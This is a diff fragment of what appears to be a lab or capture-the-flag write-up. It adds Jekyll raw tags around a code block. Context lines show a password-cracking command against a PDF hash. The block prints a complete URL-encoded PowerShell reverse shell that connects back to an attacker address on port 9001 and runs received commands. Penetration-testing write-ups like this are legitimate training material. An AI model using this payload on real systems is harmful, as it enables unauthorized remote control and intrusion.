@@ -72,7 +72,9 @@ john --wordlist=/usr/share/wordlists/rockyou.txt pdf.hash
 ![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241210103111.png?raw=true)
 We now execute a reverse shell:
 ```
+{% raw %}
 http://192.168.164.99/?$LHOST%20=%20%22192.168.45.189%22;%20$LPORT%20=%209001;%20$TCPClient%20=%20New-Object%20Net.Sockets.TCPClient($LHOST,%20$LPORT);%20$NetworkStream%20=%20$TCPClient.GetStream();%20$StreamReader%20=%20New-Object%20IO.StreamReader($NetworkStream);%20$StreamWriter%20=%20New-Object%20IO.StreamWriter($NetworkStream);%20$StreamWriter.AutoFlush%20=%20$true;%20$Buffer%20=%20New-Object%20System.Byte[]%201024;%20while%20($TCPClient.Connected)%20{%20while%20($NetworkStream.DataAvailable)%20{%20$RawData%20=%20$NetworkStream.Read($Buffer,%200,%20$Buffer.Length);%20$Code%20=%20([text.encoding]::UTF8).GetString($Buffer,%200,%20$RawData%20-1)%20};%20if%20($TCPClient.Connected%20-and%20$Code.Length%20-gt%201)%20{%20$Output%20=%20try%20{%20Invoke-Expression%20($Code)%202%3E&1%20}%20catch%20{%20$_%20};%20$StreamWriter.Write(%22$Output`n%22);%20$Code%20=%20$null%20}%20};%20$TCPClient.Close();%20$NetworkStream.Close();%20$StreamReader.Close();%20$StreamWriter.Close()
+{% endraw %}
 ```
 
 
